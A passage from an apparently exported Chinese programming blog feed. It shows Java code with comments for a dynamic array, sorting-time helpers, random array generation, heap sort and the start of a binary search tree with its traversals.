class="line">    <span class="comment">// 修改index索引位置的元素为e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"set failed. Index is illegal."</span>);</span><br><span class="line">        data[index] = e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中是否有元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查找数组中元素e所在的索引，如果不存在元素e，则返回-1</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length / <span class="number">4</span> &amp;&amp; data.length / <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">            resize(data.length / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt;= size || j &lt; <span class="number">0</span> || j &gt;= size)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Index is illegal."</span>);</span><br><span class="line"></span><br><span class="line">        E t = data[i];</span><br><span class="line">        data[i] = data[j];</span><br><span class="line">        data[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line">        E[] newData = (E[])<span class="keyword">new</span> Object[newCapacity];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        data = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（辅助进行算法时间输出的）"><a href="#SortingHelper-java（辅助进行算法时间输出的）" class="headerlink" title="SortingHelper.java（辅助进行算法时间输出的）"></a>SortingHelper.java（辅助进行算法时间输出的）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortingHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SortingHelper</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//私有类</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isSorted</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt; arr.length; i++)</span><br><span class="line">            <span class="keyword">if</span> (arr[i - <span class="number">1</span>].compareTo(arr[i]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sortTest</span><span class="params">(String sortname, E[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">if</span>(sortname.equals(<span class="string">"SelectionSort"</span>)) &#123;</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort"</span>))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort2"</span>))</span><br><span class="line">            InsertionSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort"</span>))</span><br><span class="line">            MergeSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort2"</span>))</span><br><span class="line">            MergeSort.sort2(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort3"</span>))</span><br><span class="line">            MergeSort.sort3(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSort4"</span>))</span><br><span class="line">            MergeSort.sort4(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"MergeSortBU"</span>))</span><br><span class="line">            MergeSort.sortBU(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort"</span>))</span><br><span class="line">            QuickSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort2"</span>))</span><br><span class="line">            QuickSort.sort2ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"QuickSort3"</span>))</span><br><span class="line">            QuickSort.sort3ways(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"HeapSort"</span>))</span><br><span class="line">            HeapSort.sort(arr);</span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//纳米要/9个零</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!SortingHelper.isSorted(arr))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sortname + <span class="string">"failed"</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"%s , n = %d : %f s "</span>, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="ArrayGenerator-java（生成随机的一组数组或有序的一组数组）"><a href="#ArrayGenerator-java（生成随机的一组数组或有序的一组数组）" class="headerlink" title="ArrayGenerator.java（生成随机的一组数组或有序的一组数组）"></a>ArrayGenerator.java（生成随机的一组数组或有序的一组数组）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ArrayGenerator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateOrderedArray(<span class="keyword">int</span> n)&#123;</span><br><span class="line"></span><br><span class="line">       Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n ; i++)</span><br><span class="line">           arr[i] = i;</span><br><span class="line">       <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成一个长度为 n 的随机数组， 每个数字的范围是[ 0 , bound)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Integer[] generateRandomArray(<span class="keyword">int</span> n, <span class="keyword">int</span> bound)&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = <span class="keyword">new</span> Integer[n];</span><br><span class="line">        Random rnd = <span class="keyword">new</span> Random();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n; i++)</span><br><span class="line">            arr[i] = rnd.nextInt(bound); <span class="comment">//从0到bound前闭后开</span></span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="HeapSort-java-简单的堆排序"><a href="#HeapSort-java-简单的堆排序" class="headerlink" title="HeapSort.java(简单的堆排序)"></a>HeapSort.java(简单的堆排序)</h2><blockquote>
<p>因为是最大堆，所以进行了逆置输出</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HeapSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">HeapSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        MaxHeap&lt;E&gt; maxHeap = <span class="keyword">new</span> MaxHeap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(E e: data)</span><br><span class="line">            maxHeap.add(e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = data.length - <span class="number">1</span> ; i &gt;= <span class="number">0</span> ; i --)</span><br><span class="line">            data[i] = maxHeap.extractMax();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1000000</span>;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = ArrayGenerator.generateRandomArray(n , n);</span><br><span class="line">        Integer[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr3 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr4 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        Integer[] arr5 = Arrays.copyOf(arr, arr.length);</span><br><span class="line"></span><br><span class="line">        sort(arr5);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++)&#123;</span><br><span class="line">            System.out.println(arr5[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SortingHelper.sortTest(<span class="string">"MergeSort"</span>, arr);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort2"</span>, arr2);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"QuickSort3"</span>, arr3);</span><br><span class="line">        SortingHelper.sortTest(<span class="string">"HeapSort"</span>, arr4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>堆排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-二分搜索树前中后序遍历和增查改（完整代码）</title>
    <url>/2021/06/30/%E3%80%90Java%E3%80%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%88%86%E6%90%9C%E7%B4%A2%E6%A0%91%E5%89%8D%E4%B8%AD%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%92%8C%E5%A2%9E%E6%9F%A5%E6%94%B9%EF%BC%88%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="二分搜索树的前中后序遍历和增删查（完整代码）"><a href="#二分搜索树的前中后序遍历和增删查（完整代码）" class="headerlink" title="二分搜索树的前中后序遍历和增删查（完整代码）"></a>二分搜索树的前中后序遍历和增删查（完整代码）</h1><h2 id="BST-java（前序中序和后序的递归算法等）"><a href="#BST-java（前序中序和后序的递归算法等）" class="headerlink" title="BST.java（前序中序和后序的递归算法等）"></a>BST.java（前序中序和后序的递归算法等）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.Queue;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BST</span>&lt;<span class="title">E</span> <span class="keyword">extends</span> <span class="title">Comparable</span>&lt;<span class="title">E</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> E e;</span><br><span class="line">        <span class="keyword">public</span> Node left;</span><br><span class="line">        <span class="keyword">public</span> Node right;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.e = e;</span><br><span class="line">            left = <span class="keyword">null</span>;</span><br><span class="line">            right = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node root;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BST</span><span class="params">()</span></span>&#123;</span><br><span class="line">        root = <span class="keyword">null</span>;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向二分搜索树中添加新的元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        root = add(root , e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向以node为跟的二分搜索树中插入元素E，递归算法</span></span><br><span class="line">    <span class="comment">// 返回插入新节点后二分搜索树的根</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Node <span class="title">add</span><span class="params">(Node node, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if(e.equals(node.e))</span></span><br><span class="line"><span class="comment">//            return;</span></span><br><span class="line"><span class="comment">//        else if(e.compareTo(node.e) &lt; 0 &amp;&amp; node.left == null)&#123;</span></span><br><span class="line"><span class="comment">//            node.left = new Node(e);</span></span><br><span class="line"><span class="comment">//            size ++;</span></span><br><span class="line"><span class="comment">//            return;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else if(e.compareTo(node.e) &gt; 0 &amp;&amp; node.right == null)&#123;</span></span><br><span class="line"><span class="comment">//            node.right = new Node(e);</span></span><br><span class="line"><span class="comment">//            size ++;</span></span><br><span class="line"><span class="comment">//            return;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            size ++;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Node(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(e.compareTo(node.e) &lt; <span class="number">0</span>)</span><br><span class="line">            node.left = add(node.left, e);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.compareTo(node.e)&gt;<span class="number">0</span>)</span><br><span class="line">                node.right = add(node.right,e);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//看当前二分搜索树中是否包含元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> contains(root , e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 看以node为跟的二分搜索树中是否包含元素e，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Node node, E e)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(e.compareTo(node.e) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(e.compareTo(node.e) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> contains(node.left, e);</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">// e.comparaTo(node.e) &gt; 0</span></span><br><span class="line">            <span class="keyword">return</span> contains(node.right, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的前序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">        preOrder(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前序遍历以node为根的二分搜索树，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(node.e);</span><br><span class="line">        preOrder(node.left);</span><br><span class="line">        preOrder(node.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的非递归前序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">preOrderNR</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Stack&lt;Node&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            Node cur = stack.pop();</span><br><span class="line">            System.out.println(cur.e);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="keyword">null</span>)</span><br><span class="line">                stack.push(cur.right);</span><br><span class="line">            <span class="keyword">if</span>(cur.left != <span class="keyword">null</span>)</span><br><span class="line">                stack.push(cur.left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的中序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">        inOrder(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 中序遍历以node为根的二分搜索树，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        inOrder(node.left);</span><br><span class="line">        System.out.println(node.e);</span><br><span class="line">        inOrder(node.right);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的后序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line">        postOrder(root);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 后序遍历以node为根的二分搜索树，递归算法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postOrder</span><span class="params">(Node node)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        postOrder(node.left);</span><br><span class="line">        postOrder(node.right);</span><br><span class="line">        System.out.println(node.e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 二分搜索树的层序遍历</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">levelOrder</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Queue&lt;Node&gt; q = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        q.add(root);</span><br><span class="line">        <span class="keyword">while</span>(!q.isEmpty())&#123;</span><br><span class="line">            Node cur = q.remove();</span><br><span class="line">            System.out.println(cur.e);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(cur.left != <span class="keyword">null</span>)</span><br><span class="line">                q.add(cur.left);</span><br><span class="line">            <span class="keyword">if</span>(cur.right != <span class="keyword">null</span>)</span><br><span class="line">                q.add(cur.right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        generateBSTString(root, <span class="number">0</span>, res);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成以node为根节点，深度为depth描述二叉树的字符串</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">generateBSTString</span><span class="params">(Node node, <span class="keyword">int</span> depth, StringBuilder res)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            res.append(generateDepthString(depth) + <span class="string">"null\n"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.append(generateDepthString(depth) + node.e + <span class="string">"\n"</span>);</span><br><span class="line">        generateBSTString(node.left, depth +<span class="number">1</span>, res);</span><br><span class="line">        generateBSTString(node.right, depth +<span class="number">1</span>, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">generateDepthString</span><span class="params">(<span class="keyword">int</span> depth)</span></span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; depth; i ++)</span><br><span class="line">            res.append(<span class="string">"--"</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 寻找二分搜索树的最小元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">minimum</span><span 